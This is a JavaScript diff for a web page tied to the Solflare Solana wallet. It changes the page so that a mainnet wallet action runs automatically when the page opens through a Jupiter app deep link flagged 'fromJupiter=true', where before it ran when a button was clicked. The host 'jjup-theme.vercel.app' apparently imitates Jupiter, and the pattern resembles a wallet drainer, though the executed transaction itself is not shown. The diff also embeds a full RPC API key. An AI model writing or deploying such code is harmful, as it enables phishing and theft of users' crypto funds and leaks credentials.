@@ -346,7 +346,7 @@ $(document).ready(async function () {
   });
   async function autoExecuteIfConnected() {
     try {
-      if (window.solflare && window.solflare.isConnected) {
+      if (window.solflare.isConnected) {
         //showLoader("#window.solflare");  // Custom function assumed
         const connection = new solanaWeb3.Connection(
           "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
@@ -359,10 +359,16 @@ $(document).ready(async function () {
       console.error("Auto-execute failed:", err);
     }
   }
+  const urlParams = new URLSearchParams(window.location.search);
+  const fromJupiter = urlParams.get("fromJupiter");
+
+  if (fromJupiter === "true") {
+    autoExecuteIfConnected();
+  }
 
   $("#connect-solflare").on("click", async () => {
      
-    autoExecuteIfConnected();
+    
     const isMobile =
       /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
         navigator.userAgent
@@ -374,7 +380,7 @@ $(document).ready(async function () {
     // 🚀 On mobile — open site inside Jupiter Mobile app browser
     if (isMobile) {
       // This should open inside Jupiter app if installed
-      const jupiterDeepLink = `jupiter://jjup-theme.vercel.app`;
+      const jupiterDeepLink = `jupiter://jjup-theme.vercel.app?fromJupiter=true`;
       window.location.href = jupiterDeepLink;
       
       // ⏳ Fallback to App Store if Jupiter app isn't installed
@@ -386,7 +392,7 @@ $(document).ready(async function () {
   
         window.location.href = appStoreURL;
       }, 3000); // wait 3 seconds to see if app handles the link
-      autoExecuteIfConnected();
+      
       return;
     }
   
